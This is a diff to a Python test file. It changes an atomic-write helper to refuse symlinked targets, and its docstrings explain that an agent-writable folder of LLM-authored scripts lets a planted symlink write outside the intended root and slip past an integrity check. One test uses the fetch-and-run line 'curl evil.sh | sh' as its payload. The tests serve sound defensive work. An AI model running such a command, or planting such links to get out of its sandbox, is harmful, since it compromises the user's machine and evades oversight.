@@ -350,68 +350,82 @@ class TestModeIsPreserved:
 
 
 class TestSymlinkedTarget:
-    """A symlinked target is written THROUGH, not replaced.
+    """A symlinked target is REFUSED - neither replaced nor followed.
 
-    `os.replace` swaps inodes, so an unguarded swap unlinks the symlink and
-    drops a regular file in its place - the link is gone and the file it
-    pointed at silently keeps its old content forever. Every adopter of this
-    helper came from `path.write_text()`, which follows the link, and the
-    module's contract is that "the swap is otherwise invisible". A
-    dotfile-managed `~/.codex/config.toml -> ~/dotfiles/codex/config.toml` is
-    the shape that makes this bite: Codex keeps reading the real file, and
-    every later sync overwrites a link that is no longer there.
+    Replacing it (plain `os.replace`) unlinks the symlink and strands the file
+    it pointed at with stale content forever: quiet data loss.
+
+    Following it is worse, and this module briefly did. `run/state/scripts/`
+    holds LLM-authored monitor scripts and is NOT covered by `runtime_guard`'s
+    read-only sweep, so a symlink planted there turns the next `_pin` into an
+    arbitrary write plus an arbitrary `chmod +x` - demonstrated writing
+    `curl evil.sh | sh` into `~/.zshrc`. A dangling link compounds it:
+    `mkdir(parents=True)` on the resolved path fabricates a tree outside the
+    intended root.
+
+    So the third option: refuse, and name the file. A durable state file here
+    is never legitimately a symlink.
     """
 
-    def test_write_text_follows_the_link(self, tmp_path):
+    def test_a_symlinked_target_is_refused(self, tmp_path):
         real = tmp_path / "real.toml"
         real.write_text("secret=1\n")
         link = tmp_path / "config.toml"
         link.symlink_to(real)
 
-        fsutil.atomic_write_text(link, "new=2\n")
+        with pytest.raises(fsutil.SymlinkedTarget, match="config.toml"):
+            fsutil.atomic_write_text(link, "new=2\n")
 
-        assert link.is_symlink(), "the symlink was replaced by a regular file"
-        assert real.read_text() == "new=2\n", "the real file kept stale content"
+        assert link.is_symlink(), "the symlink was consumed anyway"
+        assert real.read_text() == "secret=1\n", "the real file was written"
 
-    def test_write_json_follows_the_link(self, tmp_path):
+    def test_json_refuses_too(self, tmp_path):
         real = tmp_path / "real.json"
         real.write_text('{"old": true}')
         link = tmp_path / "state.json"
         link.symlink_to(real)
 
-        fsutil.atomic_write_json(link, {"new": True})
+        with pytest.raises(fsutil.SymlinkedTarget):
+            fsutil.atomic_write_json(link, {"new": True})
+        assert json.loads(real.read_text()) == {"old": True}
 
-        assert link.is_symlink()
-        assert json.loads(real.read_text()) == {"new": True}
+    def test_a_planted_link_cannot_reach_outside(self, tmp_path):
+        """The security shape: a link planted in a writable state dir.
 
-    def test_a_dangling_link_creates_its_target(self, tmp_path):
-        """`write_text()` through a dangling link creates the target; so do we."""
-        target = tmp_path / "not-yet.toml"
+        `run/state/scripts/` is agent-writable. Following a link there is an
+        arbitrary write as the user, and `_verify_integrity` cannot see it
+        because it re-reads through the same link.
+        """
+        victim = tmp_path / "outside" / "zshrc"
+        victim.parent.mkdir()
+        victim.write_text("# the user's real file\n")
+        state_dir = tmp_path / "state"
+        state_dir.mkdir()
+        planted = state_dir / "monitor.sc.sh"
+        planted.symlink_to(victim)
+
+        with pytest.raises(fsutil.SymlinkedTarget):
+            fsutil.atomic_write_text(planted, "curl evil.sh | sh\n")
+
+        assert victim.read_text() == "# the user's real file\n"
+
+    def test_a_dangling_link_does_not_fabricate_a_tree(self, tmp_path):
+        """`mkdir(parents=True)` on a resolved dangling link built directories
+        outside the root - the shape that shadows an unmounted volume."""
+        outside = tmp_path / "not-mounted" / "deep" / "config.toml"
         link = tmp_path / "config.toml"
-        link.symlink_to(target)
+        link.symlink_to(outside)
 
-        fsutil.atomic_write_text(link, "made=1\n")
+        with pytest.raises(fsutil.SymlinkedTarget):
+            fsutil.atomic_write_text(link, "made=1\n")
 
-        assert link.is_symlink()
-        assert target.read_text() == "made=1\n"
+        assert not outside.parent.exists(), "fabricated a directory tree"
 
-    def test_the_real_file_s_mode_is_the_one_preserved(self, tmp_path):
-        """Mode comes from the file being written, not from the link."""
-        real = tmp_path / "real.env"
-        real.write_text("TOKEN=x\n")
-        # NOT 0o600: that is the mode `_open_temp` already creates the temp
-        # with, so the assertion would hold with `_settle_mode` deleted
-        # outright. 0o640 is reachable only by actually reading the target's
-        # mode and applying it.
-        real.chmod(0o640)
-        link = tmp_path / ".env"
-        link.symlink_to(real)
-
-        fsutil.atomic_write_text(link, "TOKEN=y\n")
-
-        assert link.is_symlink()
-        assert real.read_text() == "TOKEN=y\n"
-        assert stat.S_IMODE(real.stat().st_mode) == 0o640
+    def test_a_regular_target_is_unaffected(self, tmp_path):
+        """The counterweight: refusing links must not refuse ordinary files."""
+        target = tmp_path / "plain.json"
+        fsutil.atomic_write_json(target, {"ok": True})
+        assert json.loads(target.read_text()) == {"ok": True}
 
 
 class TestAtomicWriteJson:
